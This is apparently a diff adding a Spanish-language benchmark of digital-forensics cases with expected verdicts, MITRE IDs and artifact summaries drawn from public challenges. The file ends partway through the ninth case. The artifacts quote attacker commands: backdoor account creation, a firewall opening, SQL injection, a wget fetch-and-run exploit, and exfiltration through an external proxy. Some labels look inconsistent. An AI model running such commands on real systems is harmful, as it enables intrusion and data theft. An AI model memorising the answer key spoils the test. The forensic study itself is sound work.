@@ -1,0 +1,667 @@
+[
+  {
+    "case_id": "VIGIA-REAL-001",
+    "case_name": "NIST Hacking Case (Greg Schardt / Mr. Evil)",
+    "source_dataset": "NIST CFReDS - Hacking Case",
+    "source_url": "https://cfreds.nist.gov/all/NIST/HackingCase",
+    "description": "El 09/20/04, una notebook Dell CPi serial VLQLW fue encontrada abandonada con una tarjeta PCMCIA wireless y antena 802.11b casera. El sospechoso Greg Schardt alias Mr. Evil realizaba war driving cerca de hotspots WiFi públicos para interceptar tráfico y robar credenciales.",
+    "expected_verdict": "MALICE",
+    "confidence_expected": 95,
+    "expected_mitre_ttps": [
+      "T1040",
+      "T1552",
+      "T1567",
+      "T1071",
+      "T1018"
+    ],
+    "carnegie_pattern_expected": null,
+    "artifacts": [
+      {
+        "artifact_id": "ART-001",
+        "type": "registry",
+        "content": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\RegisteredOwner = Greg Schardt | HKLM\\SYSTEM\\ControlSet001\\Control\\ComputerName\\ComputerName = N-1A9ODN6ZXK4LQ | HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DefaultUserName = Mr. Evil",
+        "forensic_anomalies": [
+          "El nombre de usuario por defecto es Mr. Evil, indicativo de alias de atacante",
+          "El registered owner coincide con el sospechoso identificado"
+        ],
+        "peirce_layer": "SECONDNESS"
+      },
+      {
+        "artifact_id": "ART-002",
+        "type": "network_flow",
+        "content": "Archivo pcap interceptado en C:\\Documents and Settings\\Mr. Evil\\interception | Víctima: Windows CE Pocket PC | Sites accedidos: login.passport.com, mobile.msn.com, MSN Hotmail | Captura realizada con Ethereal",
+        "forensic_anomalies": [
+          "Archivo pcap con tráfico interceptado de dispositivos de terceros",
+          "La víctima usaba Windows CE Pocket PC en hotspot público"
+        ],
+        "peirce_layer": "FIRSTNESS"
+      },
+      {
+        "artifact_id": "ART-003",
+        "type": "bash_history",
+        "content": "Canales IRC accedidos: #Chataholics.UnderNet, #CyberCafe.UnderNet, #Elite.Hackers.UnderNet, #evilfork.EFnet, #ISO-WAREZ.EFnet, #thedarktower.AfterNET | Usuario IRC: Mini Me, Nick: Mr, Alt: mrevilrulez",
+        "forensic_anomalies": [
+          "Presencia en canales de hacking (#Elite.Hackers.UnderNet, #evilfork.EFnet)",
+          "El nickname mrevilrulez coincide con el email mrevilrulez@yahoo.com"
+        ],
+        "peirce_layer": "THIRDNESS"
+      },
+      {
+        "artifact_id": "ART-004",
+        "type": "file_metadata",
+        "content": "Archivos en Recycle Bin: Dc1.exe (lalsetup250.exe - Look@LAN installer), Dc2.exe (netstumblerinstaller_0_4_0.exe), Dc3.exe (WinPcap_3_01_a.exe), Dc4.exe (ethereal-setup-0.10.6.exe) | Hash MD5 imagen: aee4fcd9301c03b3b054623ca261959a",
+        "forensic_anomalies": [
+          "Presencia de ejecutables de herramientas de hacking en Recycle Bin sin haber sido eliminados permanentemente",
+          "NetStumbler es herramienta específica para war driving"
+        ],
+        "peirce_layer": "SECONDNESS"
+      },
+      {
+        "artifact_id": "ART-005",
+        "type": "email_header",
+        "content": "SMTP: whoknowsme@sbcglobal.net | Email principal: mrevilrulez@yahoo.com | NNTP: Configurado para 5+ newsgroups | Programas: Outlook Express, mIRC",
+        "forensic_anomalies": [
+          "Dirección SMTP diferente del email principal (posible evasión)",
+          "Uso de newsgroups para comunicación alternativa"
+        ],
+        "peirce_layer": "SECONDNESS"
+      }
+    ],
+    "peirce_expected": {
+      "firstness": "Presencia de múltiples herramientas de hacking wireless y capturas de red en un laptop",
+      "secondness": "Los registros vinculan el equipo a Greg Schardt quien usa el alias Mr. Evil, y se encuentran capturas de tráfico de terceras personas",
+      "thirdness": "El sospechoso realiza war driving sistemático cerca de hotspots WiFi para interceptar comunicaciones y robar credenciales financieras"
+    },
+    "devil_advocate": "Greg Schardt es un profesional de seguridad legítimo que analiza redes como parte de su trabajo de pentesting",
+    "abstention_risk": "bajo"
+  },
+  {
+    "case_id": "VIGIA-REAL-002",
+    "case_name": "NIST Data Leakage Case (Sr. Informant)",
+    "source_dataset": "NIST CFReDS - Data Leakage Case",
+    "source_url": "https://cfreds.nist.gov/all/NIST/DataLeakageCase",
+    "description": "El Sr. Informant, gerente de desarrollo tecnológico en la empresa OOO, recibió una oferta de un conspirador para filtrar información confidencial sobre nuevas tecnologías. Utilizó email, Google Drive, USB y CD-R para exfiltrar datos mientras aplicaba técnicas anti-forenses.",
+    "expected_verdict": "MALICE",
+    "confidence_expected": 93,
+    "expected_mitre_ttps": [
+      "T1048",
+      "T1567",
+      "T1078",
+      "T1070",
+      "T1564"
+    ],
+    "carnegie_pattern_expected": "Evasion Accountability",
+    "artifacts": [
+      {
+        "artifact_id": "ART-001",
+        "type": "auth_log",
+        "content": "Event ID 4624 (Logon) - 2015-03-23 16:00:22 Eastern Time+DST | Event ID 4647 (Logoff) - 2015-03-23 17:02:53 | Event ID 4608 (Startup) - 2015-03-24 09:21:29 | Event ID 1100 (Shutdown) - 2015-03-24 17:07:26 | Cuenta: informant | IP: 10.11.11.129",
+        "forensic_anomalies": [
+          "Actividad de logon fuera del horario permitido (16:00 es el límite según política)",
+          "Patrón de logoff rápido el 24 de marzo tras actividad de exfiltración"
+        ],
+        "peirce_layer": "FIRSTNESS"
+      },
+      {
+        "artifact_id": "ART-002",
+        "type": "email_header",
+        "content": "From: spy.conspirator@nist.gov | To: jaman.informant@nist.gov | Subject: (important request) | Body: conformal But, I need a more data. Do your best. | Fecha: 2015-03-23 | Follow-up: Subject 'Last request' - 2015-03-24 09:26: This is the last request. I want to get the remaining data.",
+        "forensic_anomalies": [
+          "Emails de un dominio externo (nist.gov) solicitando datos confidenciales",
+          "Lenguaje conspirativo ('conformal', 'I need more data')"
+        ],
+        "peirce_layer": "SECONDNESS"
+      },
+      {
+        "artifact_id": "ART-003",
+        "type": "file_metadata",
+        "content": "Archivos confidenciales encontrados: [secret_project]_pricing_decision.docx, [secret_project]_final_meeting.pptx | Acción: Renombrados cambiando extensiones (.docx a .mp3, .pptx a .jpg) | Timestamp renombrado: 2015-03-23 16:26-17:02 Eastern Time",
+        "forensic_anomalies": [
+          "Cambio deliberado de extensiones para ocultar el contenido real",
+          "Los archivos son confidenciales según la política de la empresa"
+        ],
+        "peirce_layer": "SECONDNESS"
+      },
+      {
+        "artifact_id": "ART-004",
+        "type": "bash_history",
+        "content": "Google Drive instalado y logueado con aman.informat.personall@gmail.com | Archivos subidos a Google Drive y compartidos | Email enviado: 'Login is below.' | CCleaner y Eraser instalados posteriormente",
+        "forensic_anomalies": [
+          "Uso de cuenta personal de Gmail para exfiltrar datos corporativos",
+          "Instalación de herramientas anti-forenses (CCleaner, Eraser) después de la exfiltración"
+        ],
+        "peirce_layer": "THIRDNESS"
+      },
+      {
+        "artifact_id": "ART-005",
+        "type": "network_flow",
+        "content": "Conexión a unidad de red: \\\\10.11.11.128\\secured_drive | Directorios recorridos en búsqueda de archivos | Archivos copiados desde red a Desktop\\$ data | Desconexión de unidad de red | Network drive IP: 10.11.11.128",
+        "forensic_anomalies": [
+          "Acceso a unidad de red segura seguido de copia local de archivos",
+          "La desconexión inmediata después de copiar archivos indica patrón de recolección selectiva"
+        ],
+        "peirce_layer": "SECONDNESS"
+      }
+    ],
+    "peirce_expected": {
+      "firstness": "Emails sospechosos con solicitudes de datos, renombrado de archivos, e instalación de herramientas de limpieza",
+      "secondness": "El timeline muestra secuencia coherente: solicitud → búsqueda → copia → renombrado → exfiltración → anti-forense",
+      "thirdness": "El Sr. Informant actuó con intención maliciosa como insider threat, coordinando exfiltración de datos corporativos a través de múltiples canales"
+    },
+    "devil_advocate": "El Sr. Informant estaba realizando transferencias legítimas de trabajo en horario extendido y las herramientas de limpieza fueron instaladas por el departamento de IT",
+    "abstention_risk": "bajo"
+  },
+  {
+    "case_id": "VIGIA-REAL-003",
+    "case_name": "Ali Hadi Web Server Compromise",
+    "source_dataset": "Ali Hadi Challenge #1 - Web Server Case",
+    "source_url": "https://www.ashemery.com/dfir.html",
+    "description": "El servidor web de una empresa con Windows Server 2008 Standard y XAMPP fue comprometido a través de SQL injection en DVWA. El atacante desplegó webshells PHP, creó cuentas de usuario y configuró acceso RDP desde la subred interna.",
+    "expected_verdict": "MALICE",
+    "confidence_expected": 94,
+    "expected_mitre_ttps": [
+      "T1190",
+      "T1059",
+      "T1136.001",
+      "T1021.001",
+      "T1505.003",
+      "T1070"
+    ],
+    "carnegie_pattern_expected": null,
+    "artifacts": [
+      {
+        "artifact_id": "ART-001",
+        "type": "network_flow",
+        "content": "Apache access.log | IP atacante: 192.168.56.102 | User-Agent: sqlmap/1.* (herramienta automatizada) | Requests: GET /dvwa/vulnerabilities/sqli/?id=1 AND 1=1 UNION SELECT... | Otro User-Agent: IceWeasel (navegador típico de Kali Linux)",
+        "forensic_anomalies": [
+          "Presencia de User-Agent de sqlmap indicando ataque de SQL injection automatizado",
+          "La IP 192.168.56.102 es típica de máquinas virtuales Kali Linux en VirtualBox"
+        ],
+        "peirce_layer": "FIRSTNESS"
+      },
+      {
+        "artifact_id": "ART-002",
+        "type": "bash_history",
+        "content": "Comandos ejecutados via webshell/cmd.exe: net user user1 user1 /add | net localgroup 'Remote Desktop Users' user1 /add | netsh advfirewall firewall add rule name='Remote Desktop' dir=in action=allow protocol=TCP localport=3389 remoteip=192.168.56.0/24 | net user hacker hacker /add",
+        "forensic_anomalies": [
+          "Creación simultánea de dos cuentas de usuario no autorizadas (user1 y hacker)",
+          "Modificación del firewall para permitir RDP desde subred específica del atacante"
+        ],
+        "peirce_layer": "SECONDNESS"
+      },
+      {
+        "artifact_id": "ART-003",
+        "type": "process_list",
+        "content": "httpd.exe PID 2796 y PID 2880 (Apache HTTP Server) | Memory strings muestran trazas de comandos ejecutados | Archivos temporales: tmpukudk.php, tmpbiwuc.php (droppers PHP) | Volatility profile: Win2008SP2x86 | Hostname: WIN-L0ZZQ76PMUF",
+        "forensic_anomalies": [
+          "Procesos httpd.exe contienen strings de comandos de sistema en memoria",
+          "Archivos PHP temporales con nombres aleatorios indican webshells dropeados"
+        ],
+        "peirce_layer": "SECONDNESS"
+      },
+      {
+        "artifact_id": "ART-004",
+        "type": "file_metadata",
+        "content": "SAM Registry Hive: Usuarios creados simultáneamente - user1 [SID 1005] y hacker [SID 1006] | MFT entries de tmpukudk y tmpbiwuc | Archivo webshells.zip contiene shells incluyendo C99 | Timestamp creación usuarios: 02/09/2015 09:04:35 PDT",
+        "forensic_anomalies": [
+          "Dos usuarios nuevos con SIDs consecutivos creados en el mismo timestamp",
+          "Presencia de C99 shell en archivo webshells.zip"
+        ],
+        "peirce_layer": "SECONDNESS"
+      }
+    ],
+    "peirce_expected": {
+      "firstness": "Logs de Apache muestran requests de sqlmap y webshells PHP en servidor comprometido",
+      "secondness": "Los comandos net user y firewall rules correlacionan con la creación de cuentas en SAM y la apertura de RDP",
+      "thirdness": "El atacante explotó SQLi, desplegó webshells para persistencia, escaló privilegios creando cuentas y preparó acceso remoto vía RDP"
+    },
+    "devil_advocate": "El administrador del sistema estaba realizando pruebas de penetración autorizadas internamente",
+    "abstention_risk": "bajo"
+  },
+  {
+    "case_id": "VIGIA-REAL-004",
+    "case_name": "Ali Hadi SysInternals Malware Case",
+    "source_dataset": "Ali Hadi Challenge #7 - SysInternals Case",
+    "source_url": "https://www.binary-zone.com/2023/03/27/challenge-7-sysinternals-case/",
+    "description": "Un usuario descargó lo que creía era el SysInternals Suite pero era un malware downloader. El sistema se volvió lento y no responsivo tras la ejecución. El malware modificó el archivo hosts, descargó un payload secundario y lo instaló como servicio Windows falso.",
+    "expected_verdict": "MALICE",
+    "confidence_expected": 92,
+    "expected_mitre_ttps": [
+      "T1204.002",
+      "T1543.003",
+      "T1562.001",
+      "T1070.004",
+      "T1199"
+    ],
+    "carnegie_pattern_expected": "Masquerading Legitimacy",
+    "artifacts": [
+      {
+        "artifact_id": "ART-001",
+        "type": "file_metadata",
+        "content": "Archivo: C:\\Users\\Public\\Downloads\\SysInternals.exe | Hash VT: 72e6d1728a546c2f3ee32c063ed09fa6ba8c46ac33b0dd2e354087c1ad26ef48 | Info versión falsificada: CompanyName='SysInternals, Inc.', FileDescription='SysInternals Suite Downloader', FileVersion='2.0.0.1' | APIs: URLDownloadToFileA, InternetOpenUrlA, ShellExecuteA",
+        "forensic_anomalies": [
+          "El ejecutable tiene información de versión que imita a SysInternals (Microsoft) pero no es legítimo",
+          "Presencia de APIs de descarga de archivos (URLDownloadToFileA) indica downloader"
+        ],
+        "peirce_layer": "FIRSTNESS"
+      },
+      {
+        "artifact_id": "ART-002",
+        "type": "timestamp",
+        "content": "Timeline UTC: 2022-11-15 21:16:08 - IEUser logon | 21:17:03 - PowerShell modifica Defender y hosts file | 21:18:40 - Descarga de SysInternals.exe vía MSEdge | 21:19:00 - Doble-click SysInternals.exe | 21:19:17 - Descarga de http://www.malware430.com/html/VMwareUpdate.exe | 21:19:22 - vmtoolsIO.exe instalado como servicio",
+        "forensic_anomalies": [
+          "Secuencia de eventos comprimida en 3 minutos: descarga → ejecución → descarga secundaria → instalación de servicio",
+          "La descarga desde malware430.com ocurre 17 segundos después de la ejecución"
+        ],
+        "peirce_layer": "SECONDNESS"
+      },
+      {
+        "artifact_id": "ART-003",
+        "type": "bash_history",
+        "content": "Strings del ejecutable: 'c:\\Windows\\vmtoolsIO.exe' | 'c:\\Windows\\' | '/C c:\\Windows\\vmtoolsIO.exe -install && net start VMwareIOHelperService && sc config VMwareIOHelperService start= auto' | Hosts modificado: sysinternals.com y malware430.com redirigidos a 192.168.x.x",
+        "forensic_anomalies": [
+          "El malware instala un servicio con nombre similar a VMware para pasar desapercibido",
+          "Modificación del archivo hosts para redirigir dominios legítimos a IPs internas"
+        ],
+        "peirce_layer": "SECONDNESS"
+      },
+      {
+        "artifact_id": "ART-004",
+        "type": "registry",
+        "content": "Servicio malicioso instalado: Name='VMwareIOHelperService', Executable='c:\\Windows\\vmtoolsIO.exe', StartType=auto | USN Journal: Creación y eliminación de SysInternals.exe | Prefetch eliminados: *.pf borrados (anti-forensics) | BAM/DAM: SysInternals.exe y conhost.exe ejecutados",
+        "forensic_anomalies": [
+          "Servicio con nombre que imita a VMware para evadir detección",
+          "Eliminación de archivos prefetch como técnica anti-forense"
+        ],
+        "peirce_layer": "THIRDNESS"
+      }
+    ],
+    "peirce_expected": {
+      "firstness": "Ejecutable descargado con nombre similar a SysInternals que instala servicio falso de VMware",
+      "secondness": "El timeline muestra secuencia de infección rápida con modificación de hosts, descarga de payload secundario y eliminación de evidencia",
+      "thirdness": "El atacante utilizó masquerading (nombre de herramienta legítima) para engañar al usuario, instalar persistencia vía servicio falso y evadir detección"
+    },
+    "devil_advocate": "VMwareIOHelperService es un componente legítimo de VMware Tools que se instaló automáticamente",
+    "abstention_risk": "bajo"
+  },
+  {
+    "case_id": "VIGIA-REAL-005",
+    "case_name": "Ali Hadi Encrypt Them All Case",
+    "source_dataset": "Ali Hadi Challenge #9 - Encrypt Them All Case",
+    "source_url": "https://www.binary-zone.com/2023/03/27/challenge-9-encrypt-them-all-case/",
+    "description": "Jane ha estado usando múltiples métodos de encriptación para ocultar comunicación: un archivo README encriptado con AES en Documents, un volumen BitLocker nombrado R2D2, y un archivo keys en Downloads encriptado con GPG/PGP de clave pública/privada.",
+    "expected_verdict": "SUSPICION",
+    "confidence_expected": 88,
+    "expected_mitre_ttps": [
+      "T1027",
+      "T1486",
+      "T1565",
+      "T1564"
+    ],
+    "carnegie_pattern_expected": "Concealment",
+    "artifacts": [
+      {
+        "artifact_id": "ART-001",
+        "type": "file_metadata",
+        "content": "Archivo README en directorio Documents del usuario | Estado: Encriptado con AES | Sin contraseña disponible | Posible versión sin encriptar en caché del sistema | Archivo keys en directorio Downloads | Estado: Encriptado con clave Pública/Privada GPG/PGP",
+        "forensic_anomalies": [
+          "Uso de encriptación AES para ocultar un archivo de comunicación en Documents",
+          "Uso simultáneo de encriptación asimétrica GPG para otro mensaje"
+        ],
+        "peirce_layer": "FIRSTNESS"
+      },
+      {
+        "artifact_id": "ART-002",
+        "type": "file_metadata",
+        "content": "Volumen BitLocker: Nombre='R2D2' | Estado: Encriptación completa de disco activa | Recovery key posiblemente almacenada en AD, USB o archivo de respaldo | Tipo: Full disk encryption",
+        "forensic_anomalies": [
+          "Volumen con nombre no estándar (R2D2) en lugar de etiqueta descriptiva",
+          "BitLocker aplicado a volumen específico sugiere intención de ocultar contenido"
+        ],
+        "peirce_layer": "SECONDNESS"
+      },
+      {
+        "artifact_id": "ART-003",
+        "type": "process_list",
+        "content": "GPG/PGP keys en perfil de usuario | Comunicación encriptada asimétrica con parte desconocida | Archivo 'keys' contiene mensaje para desencriptar | Posible par de claves privadas recuperables de la imagen",
+        "forensic_anomalies": [
+          "Uso de encriptación asimétrica para comunicación secreta indica coordinación previa",
+          "Múltiples métodos criptográficos aplicados sugieren capas de protección deliberadas"
+        ],
+        "peirce_layer": "THIRDNESS"
+      }
+    ],
+    "peirce_expected": {
+      "firstness": "Múltiples archivos encriptados con diferentes métodos criptográficos (AES, BitLocker, GPG)",
+      "secondness": "La combinación de capas de encriptación y el nombre R2D2 para el volumen BitLocker indican intento sistemático de ocultar información",
+      "thirdness": "Jane ha estado comunicándose secretamente usando múltiples métodos de encriptación para evadir monitoreo, posiblemente filtrando información confidencial"
+    },
+    "devil_advocate": "Jane es profesional de seguridad que aplica buenas prácticas de protección de datos personales y la empresa no tiene política contra el cifrado",
+    "abstention_risk": "medio"
+  },
+  {
+    "case_id": "VIGIA-REAL-006",
+    "case_name": "Digital Corpora M57-Jean Spear-Phishing",
+    "source_dataset": "Digital Corpora - M57-Jean Scenario",
+    "source_url": "https://digitalcorpora.org/corpora/scenarios/m57-jean/",
+    "description": "La CFO Jean Jones de M57.Biz recibió emails spoofeados aparentemente de la presidenta Alison solicitando una hoja de cálculo con datos confidenciales de empleados. El atacante manipuló el Reply-To para exfiltrar los datos a tuckergorge@gmail.com.",
+    "expected_verdict": "NOISE",
+    "confidence_expected": 90,
+    "expected_mitre_ttps": [
+      "T1566.002",
+      "T1567.001",
+      "T1585.001",
+      "T1070"
+    ],
+    "carnegie_pattern_expected": "Social Engineering via Authority Mimicry",
+    "artifacts": [
+      {
+        "artifact_id": "ART-001",
+        "type": "email_header",
+        "content": "Email #1: From: alison@m57.biz | To: jean@m57.biz | Date: 2008-07-19 16:39:57 PDT | Subject: background checks | Return-Path: simsong@xy.dreamhostps.com [SPOOFED] | Reply-To: alison@m57.biz (legítimo) | Nota: 'por favor no incluyas el texto de este email en tu respuesta'",
+        "forensic_anomalies": [
+          "Return-Path real (simsong@xy.dreamhostps.com) no coincide con el From (alison@m57.biz)",
+          "La nota de 'no incluyas el texto' es altamente sospechosa como intento de destruir evidencia"
+        ],
+        "peirce_layer": "FIRSTNESS"
+      },
+      {
+        "artifact_id": "ART-002",
+        "type": "email_header",
+        "content": "Email #2: From: alison@m57.biz | To: jean@m57.biz | Date: 2008-07-19 18:22:45 PDT | Subject: Please send me the information now | Return-Path: simsong@xy.dreamhostps.com [SPOOFED] | Reply-To: tuckergorge@gmail.com [MALICIOSO - CAMBIADO desde email #1]",
+        "forensic_anomalies": [
+          "El Reply-To cambió de alison@m57.biz a tuckergorge@gmail.com entre emails consecutivos",
+          "El mismo Return-Path spoofeado indica campaña coordinada de phishing"
+        ],
+        "peirce_layer": "SECONDNESS"
+      },
+      {
+        "artifact_id": "ART-003",
+        "type": "file_metadata",
+        "content": "Archivo: m57biz.xls | Ubicación: Desktop de Jean (C:/Documents and Settings/Jean/Desktop/) | Fecha creación: 07/20/2008 1:28:03 AM GMT | Encriptado: No | Contenido: Nombres, posiciones, salarios ($1,009,000 total) y SSNs de 8 empleados | Sector inicial: 5,160,295",
+        "forensic_anomalies": [
+          "Archivo con SSNs y salarios almacenado sin encriptar en Desktop",
+          "El archivo fue creado minutos antes de ser enviado al Reply-To malicioso"
+        ],
+        "peirce_layer": "FIRSTNESS"
+      },
+      {
+        "artifact_id": "ART-004",
+        "type": "bash_history",
+        "content": "Respuesta de Alison a Jean: 'What's a sure thing?' (16:50:20 PDT) | Email de exfiltración: Jean → tuckergorge@gmail.com con adjunto M57biz.xls (18:28:45 PDT) | Email #3 del atacante: 'Thanks!' (22:03:40 PDT)",
+        "forensic_anomalies": [
+          "La confusión de Alison demuestra que ella no envió el email original",
+          "El timing de 6 horas entre primer email y confirmación del atacante muestra ventana de ataque comprimida"
+        ],
+        "peirce_layer": "SECONDNESS"
+      },
+      {
+        "artifact_id": "ART-005",
+        "type": "process_list",
+        "content": "Binarios de sistema eliminados: ipconfig.exe, net.exe | AIM6 instalado con toolbar bundles sospechosos | Archivos HTML cached: rcstatus.htm, InstallStatus[1].htm (prompts falsos de Microsoft) | Artefactos de Remote Assistance en directorios Windows Help",
+        "forensic_anomalies": [
+          "Eliminación de binarios del sistema es indicador de anti-forense o compromiso previo",
+          "Presencia de HTML con prompts falsos de Microsoft sugiere técnicas de ingeniería social adicionales"
+        ],
+        "peirce_layer": "THIRDNESS"
+      }
+    ],
+    "peirce_expected": {
+      "firstness": "Emails con Return-Path spoofeado y Reply-To manipulado, archivo confidencial en Desktop sin encriptar",
+      "secondness": "La confusión genuina de Alison contradice la apariencia de que ella solicitó los datos; el cambio de Reply-To es la firma del ataque",
+      "thirdness": "Jean fue víctima de un ataque de spear-phishing con spoofing de identidad; el atacante manipuló headers de email para redirigir datos confidenciales a una cuenta externa"
+    },
+    "devil_advocate": "Jean actuó negligentemente al enviar datos sensibles sin verificar la solicitud, pero no con intención maliciosa",
+    "abstention_risk": "medio"
+  },
+  {
+    "case_id": "VIGIA-REAL-007",
+    "case_name": "Digital Corpora Nitroba Harassment",
+    "source_dataset": "Digital Corpora - Nitroba University Harassment Scenario",
+    "source_url": "https://digitalcorpora.org/corpora/scenarios/nitroba-university-harassment-scenario/",
+    "description": "La profesora de Química Lily Tuckrige de Nitroba State University recibió emails de acoso. El tráfico de red capturado (~60MB pcap) reveló que el perpetrador usó Gmail webmail desde una IP interna de dormitorio estudiantil, enviando cookies en plaintext sobre HTTP.",
+    "expected_verdict": "MALICE",
+    "confidence_expected": 91,
+    "expected_mitre_ttps": [
+      "T1566.001",
+      "T1585.001",
+      "T1071.001"
+    ],
+    "carnegie_pattern_expected": null,
+    "artifacts": [
+      {
+        "artifact_id": "ART-001",
+        "type": "network_flow",
+        "content": "PCAP ~60MB | IP origen externa: 140.247.62.34 (dormitorio estudiantil) | IP interna NAT: 192.168.15.4 | MAC address: 00:17:f2:e2:c0:ce (dispositivo Apple) | User Agent: Internet Explorer 6 en Windows XP SP2 | Servicio usado: willselfdestruct.com",
+        "forensic_anomalies": [
+          "Tráfico Gmail con cookies enviadas en plaintext sobre HTTP",
+          "Uso de servicio willselfdestruct.com para enviar email anónimo de acoso"
+        ],
+        "peirce_layer": "FIRSTNESS"
+      },
+      {
+        "artifact_id": "ART-002",
+        "type": "email_header",
+        "content": "Email #1: badguy@hotmail.com | Fecha: Julio 13 | Email #2: willselfdestruct.com | Mensaje: 'you can't find us and you can't hide from us. Stop teaching. Start running.' | Cuenta identificada: jcoach@gmail.com → Johnny Coach (estudiante Chem 109)",
+        "forensic_anomalies": [
+          "Mensaje de amenaza explícita enviado a través de servicio de autodestrucción",
+          "La cuenta Gmail jcoach@gmail.com fue identificada mediante cookies en plaintext en el pcap"
+        ],
+        "peirce_layer": "SECONDNESS"
+      },
+      {
+        "artifact_id": "ART-003",
+        "type": "file_metadata",
+        "content": "Setup de red: Tres mujeres comparten dormitorio (Alice, Barbara, Candice) | Wi-Fi router sin password instalado por amigo | Ethernet provisto por universidad | Roster de estudiantes: Chemistry 109 disponible",
+        "forensic_anomalies": [
+          "Router WiFi sin contraseña permite acceso anónimo y no rastreable",
+          "La combinación de Ethernet universitario + WiFi no seguro complica la atribución"
+        ],
+        "peirce_layer": "SECONDNESS"
+      }
+    ],
+    "peirce_expected": {
+      "firstness": "Emails amenazantes enviados desde servicio anónimo con cookies de Gmail expuestas en tráfico HTTP",
+      "secondness": "El análisis de pcap correlaciona la IP interna 192.168.15.4 con la cuenta jcoach@gmail.com de Johnny Coach",
+      "thirdness": "Johnny Coach, estudiante de Chemistry 109, envió emails de acoso a la profesora utilizando servicios anónimos y Gmail, siendo identificado mediante análisis de tráfico de red"
+    },
+    "devil_advocate": "La red WiFi sin contraseña significa que cualquiera pudo haber usado la conexión y el email de Johnny Coach",
+    "abstention_risk": "medio"
+  },
+  {
+    "case_id": "VIGIA-REAL-008",
+    "case_name": "Volatility Cridex Banking Trojan",
+    "source_dataset": "Volatility Foundation - Cridex Memory Sample",
+    "source_url": "https://github.com/volatilityfoundation/volatility/wiki/Memory-Samples",
+    "description": "Volcado de memoria cridex.vmem de una máquina Windows XP SP2 infectada con el troyano bancario Cridex (Feodo/Bugat, predecesor de Dridex). El malware inyecta código en explorer.exe y comunica con servidores C&C para robar credenciales bancarias.",
+    "expected_verdict": "MALICE",
+    "confidence_expected": 93,
+    "expected_mitre_ttps": [
+      "T1055",
+      "T1557",
+      "T1071.001",
+      "T1003"
+    ],
+    "carnegie_pattern_expected": "Hidden Process Masquerading",
+    "artifacts": [
+      {
+        "artifact_id": "ART-001",
+        "type": "process_list",
+        "content": "PID 1640: reader_sl.exe | Parent: explorer.exe (PID 1484) | Anomalía: Proceso oculto de pslist pero visible en psscan/psxview | explorer.exe (PID 1464) parent no aparece en pslist | Segundo proceso wuauclt.exe inusual | Sistema: Windows XP SP2 x86",
+        "forensic_anomalies": [
+          "reader_sl.exe oculto de la lista estándar de procesos (discrepancia psxview)",
+          "Parent process ID de explorer.exe (1464) no aparece en pslist/psscan indica process hollowing"
+        ],
+        "peirce_layer": "FIRSTNESS"
+      },
+      {
+        "artifact_id": "ART-002",
+        "type": "memory_string",
+        "content": "IPs C&C identificadas: 41.168.5.140:8080/zb/v_01_a/in/ | 125.19.103.198 | 188.40.0.138 | 190.81.107.70 | 85.214.204.32 | 210.56.23.100 | 211.44.250.173 | Mutexes: 746bbf3569adEncrypt, _SHuassist.mtx, SHIMLIB_LOG_MUTEX, XMR8149A9A8",
+        "forensic_anomalies": [
+          "Múltiples conexiones salientes a IPs en países de alto riesgo",
+          "Mutex '746bbf3569adEncrypt' indica actividad criptográfica maliciosa"
+        ],
+        "peirce_layer": "SECONDNESS"
+      },
+      {
+        "artifact_id": "ART-003",
+        "type": "network_flow",
+        "content": "Conexiones C&C activas desde explorer.exe (proceso inyectado) | VAD strings muestran lista de instituciones financieras objetivo | Web injection code: Fragmentos HTML de páginas bancarias | Búsqueda de strings 'password' en memoria revela credenciales capturadas",
+        "forensic_anomalies": [
+          "Código de inyección web en memoria de explorer.exe para páginas bancarias",
+          "Strings de credenciales encontradas en memoria del proceso inyectado"
+        ],
+        "peirce_layer": "THIRDNESS"
+      },
+      {
+        "artifact_id": "ART-004",
+        "type": "file_metadata",
+        "content": "reader_sl.exe simula ser Adobe Reader Speed Launcher | Inyección de código detectada vía malfind en explorer.exe | Múltiples DLLs inyectadas | El proceso legítimo reader_sl.exe de Adobe tiene comportamiento diferente",
+        "forensic_anomalies": [
+          "Masquerading: el malware usa nombre de proceso legítimo de Adobe",
+          "Inyección de código en explorer.exe detectada por malfind"
+        ],
+        "peirce_layer": "SECONDNESS"
+      }
+    ],
+    "peirce_expected": {
+      "firstness": "Proceso reader_sl.exe oculto con conexiones de red a IPs externas en memoria de explorer.exe",
+      "secondness": "Los VAD strings contienen lista de bancos objetivo y código de inyección web, las credenciales aparecen en memoria",
+      "thirdness": "Cridex es un troyano bancario que usa process injection en explorer.exe para interceptar tráfico bancario, inyectar código web falso y exfiltrar credenciales a servidores C&C"
+    },
+    "devil_advocate": "reader_sl.exe es un componente legítimo de Adobe Reader y las conexiones de red son actualizaciones de software",
+    "abstention_risk": "bajo"
+  },
+  {
+    "case_id": "VIGIA-REAL-009",
+    "case_name": "DFRWS 2008 Linux Exfiltration",
+    "source_dataset": "DFRWS 2008 Forensic Challenge - Linux Memory",
+    "source_url": "https://dfrws.org/forensic-challenges/",
+    "description": "Steve Vogon, empleado de una empresa, intentó exfiltrar datos confidenciales copiando archivos desde un share administrativo, comprimiéndolos y transferirlos vía un script Perl a través de un proxy HTTP externo.",
+    "expected_verdict": "MALICE",
+    "confidence_expected": 92,
+    "expected_mitre_ttps": [
+      "T1048",
+      "T1041",
+      "T1071",
+      "T1068",
+      "T1070"
+    ],
+    "carnegie_pattern_expected": "Data Theft Pattern",
+    "artifacts": [
+      {
+        "artifact_id": "ART-001",
+        "type": "bash_history",
+        "content": "[stevev@goldfinger ~]$ cp /mnt/hgfs/Admin_share/acct_prem.xls . | [stevev@goldfinger ~]$ cp /mnt/hgfs/Admin_share/domain.xls . | [stevev@goldfinger ~]$ cp /mnt/hgfs/Admin_share/ftp.pcap . | zip archive.zip /mnt/hgfs/Admin_share/acct_prem.xls domain.xls ftp.pcap | ./xfer.pl archive.zip | rm xfer.pl",
+        "forensic_anomalies": [
+          "Copia masiva de archivos desde share administrativo (Admin_share) a directorio personal",
+          "Eliminación del script xfer.pl después de uso (covering tracks)"
+        ],
+        "peirce_layer": "FIRSTNESS"
+      },
+      {
+        "artifact_id": "ART-002",
+        "type": "bash_history",
+        "content": "wget http://metasploit.com/users/hdm/tools/xmodulepath.tgz | tar -zpxvf xmodulepath.tgz | ./root.sh | export http_proxy='http://219.93.175.67:80'",
+        "forensic_anomalies": [
+          "Descarga de exploit de escalada de privilegios desde Metasploit",
+          "Configuración de proxy HTTP externo (219.93.175.67) para canalizar exfiltración"
+        ],
+        "peirce_layer": "SECONDNESS"
+      },
+      {
